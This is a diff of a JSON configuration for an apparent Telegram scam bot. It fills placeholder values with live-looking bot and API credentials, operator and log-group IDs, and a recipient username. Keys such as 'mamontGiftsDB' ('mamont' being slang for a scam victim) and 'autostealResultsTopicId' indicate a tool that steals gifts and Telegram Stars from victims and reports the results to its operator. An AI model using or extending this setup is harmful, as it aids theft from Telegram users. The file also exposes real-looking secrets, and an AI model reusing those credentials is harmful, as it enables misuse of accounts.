@@ -1,18 +1,20 @@
 {
-  "botToken": "7",
+  "botToken": "8562806277:AAFUvlZHw1xJYMxTgWpFi6jmH0dELwXtSxU",
   "webUrl": "https://",
-  "recipientUsername": "username",
-  "remainingStarsRecipient": "7",
-  "apiId": 2,
+  "recipientUsername": "@viuviuviuvi",
+  "remainingStarsRecipient": "8113577507",
+  "apiId": 
+38954407,
   "photourl": "https://",
-  "apiHash": "1",
+  "apiHash": "
+39402affa3b4dc5994319740f289a6c8",
   "marketWebAppUrl": "https://",
   "mamontGiftsDB": "mamont-gifts.json",
-  "adminId": 7,
-  "logGroupId": -1,
-  "logTopicId": 3,
+  "adminId": 5504235925,
+  "logGroupId": -1003317321650,
+  "logTopicId": 2,
   "autostealResultsTopicId": 4,
   "BOT_TOKEN": "7",
-  "starsChannelId": -1,
+  "starsChannelId": -1003745606728,
   "starsMessageId": -1
 }
